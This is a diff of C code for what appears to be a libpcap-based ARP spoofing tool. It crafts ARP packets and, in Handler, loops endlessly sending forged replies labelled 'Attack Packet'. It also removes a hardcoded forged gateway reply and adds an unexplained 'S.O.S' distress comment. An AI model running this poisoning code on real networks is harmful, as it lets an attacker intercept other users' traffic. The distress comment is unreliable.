@@ -14,10 +14,9 @@ int ARP_Parse(Packet* arp_packet, Target* target)
 
 void make_arp_packet(Packet* packet, Target* target, int arp_mode)
 {
-  //set broadcastMy
   if(arp_mode == REQUEST)
   {
-    packet->ethernet.dest_mac[0] = 0xff;//ff
+    packet->ethernet.dest_mac[0] = 0xff;
     packet->ethernet.dest_mac[1] = 0xff;
     packet->ethernet.dest_mac[2] = 0xff;
     packet->ethernet.dest_mac[3] = 0xff;
@@ -43,8 +42,6 @@ void make_arp_packet(Packet* packet, Target* target, int arp_mode)
     packet->arp_header.SourceProtocolAddress[2] = target->Target_IP[2];
     packet->arp_header.SourceProtocolAddress[3] = target->Target_IP[3];
   }
-
-  //set my mac 나중에 따로 만들자. 인자로 넘겨서
   packet->ethernet.src_mac[0] = target->MyMac[0];
   packet->ethernet.src_mac[1] = target->MyMac[1];
   packet->ethernet.src_mac[2] = target->MyMac[2];
@@ -52,12 +49,10 @@ void make_arp_packet(Packet* packet, Target* target, int arp_mode)
   packet->ethernet.src_mac[4] = target->MyMac[4];
   packet->ethernet.src_mac[5] = target->MyMac[5];
   //set arp protocol
-  //packet->ethernet.Protocol = 0x806;
   packet->ethernet.Protocol = htons(0x806);
   //arp header -> setting
   packet->arp_header.HardWare_AddressType = htons(0x1);
-  //packet->arp_header.HardWare_AddressType = 0x1;
-  //packet->arp_header.Protocol = 0x800;
+
   packet->arp_header.Protocol = htons(0x800);
   packet->arp_header.HardWareAddressLength = 0x6;
   packet->arp_header.ProtocolAddressLength = 0x4;
@@ -69,7 +64,7 @@ void make_arp_packet(Packet* packet, Target* target, int arp_mode)
   packet->arp_header.SourceHardWareAddress[3] = target->MyMac[3];
   packet->arp_header.SourceHardWareAddress[4] = target->MyMac[4];
   packet->arp_header.SourceHardWareAddress[5] = target->MyMac[5];
-  //set source ip
+
   //set target Mac
   packet->arp_header.TargetHardWareAddress[0] = target->Target_Mac[0];
   packet->arp_header.TargetHardWareAddress[1] = target->Target_Mac[1];
@@ -86,13 +81,6 @@ void make_arp_packet(Packet* packet, Target* target, int arp_mode)
 
 int send_arp_packet(Packet* packet, Target* target, int test_mode)
 {
-  const u_char test_packet[42] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x38, 0x00, 0x25, 0x56, 0xa8, 0x33, 0x08, 0x06, 0x00, 0x01,
-                    0x08, 0x00, 0x06, 0x04, 0x00, 0x01, 0x38, 0x00, 0x25, 0x56, 0xa8, 0x33,0xc0, 0xa8, 0x2b, 0x74,
-                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x2b, 0x89};
-  const u_char attack_packet[42] = {0x5c, 0xc5, 0xd4, 0x5e, 0x3d, 0x37, 0x38, 0x00, 0x25, 0x56, 0xa8, 0x33, 0x08, 0x06, 0x00, 0x01,
-                    0x08, 0x00, 0x06, 0x04, 0x00, 0x02, 0x38, 0x00, 0x25, 0x56, 0xa8, 0x33, 0xc0, 0xa8, 0x2b, 0x01,
-                    0x5c, 0xc5, 0xd4, 0x5e, 0x3d, 0x37, 0xc0, 0xa8, 0x2b, 0x89};
-
   const int packet_size = 42;
   pcap_t* handle = NULL;
   char errbuf[PCAP_ERRBUF_SIZE];
@@ -102,7 +90,6 @@ int send_arp_packet(Packet* packet, Target* target, int test_mode)
     error_handling("Error pcap open live", true);
   }
   int result=0;
-  printf("\n");
   if(test_mode == REQUEST)
   {
     result = pcap_inject(handle,packet, packet_size);
@@ -110,10 +97,7 @@ int send_arp_packet(Packet* packet, Target* target, int test_mode)
   else{
     result = pcap_inject(handle, packet, packet_size);
   }
-  printf("[DEBUG] byte result : %d\n",result);
-  //memcpy(packet, test_packet, 42);
 }
-//pcap compile and pcap setfilter
 int receive_arp_packet(Packet* packet, Target* target)
 {
   int result;
@@ -127,20 +111,12 @@ int receive_arp_packet(Packet* packet, Target* target)
   while (true) {
     struct pcap_pkthdr* header;
     int res = pcap_next_ex(handle, &header, &network_packet);
-    //printf("[DEBUG]res : %d\n", res);
     if (res == 0) continue;
     if (res == -1 || res == -2) break;
     if((result = check_arp_packet(network_packet)) != 0x806){ //arp packet
-      printf("[DEBUG]result : 0x%x\n", result);
       continue;
     }
     else{
-      printf("[DEBUG]result : 0x%x\n", result);
-      //Packet* receive_packet = (Packet*)netork_packet;
-      for(int i=22;i<28;i++)
-      {
-        printf("%02x ", network_packet[i]);
-      }
       memcpy(packet, network_packet, sizeof(Packet));
       break;
     }
@@ -148,7 +124,9 @@ int receive_arp_packet(Packet* packet, Target* target)
   pcap_close(handle);
   return 0;
 }
-
+/*
+S.O.S : HELP ME! DISTRESS !!! IF you see this writing , plz report close police office.
+*/
 int check_arp_packet(const u_char* network_packet)
 {
   Ethernet* ethernet = (Ethernet*)network_packet;
@@ -171,7 +149,7 @@ int Handler(Target* target)
   printf("[DEBUG] Success make Packet\n");
   while(1){
     send_arp_packet(&request_packet, target, REPLY);
-    printf("[DEBUG] Success Send Packet\n");
+    printf("[DEBUG] Success Send Attack Packet\n");
   }
 
 }
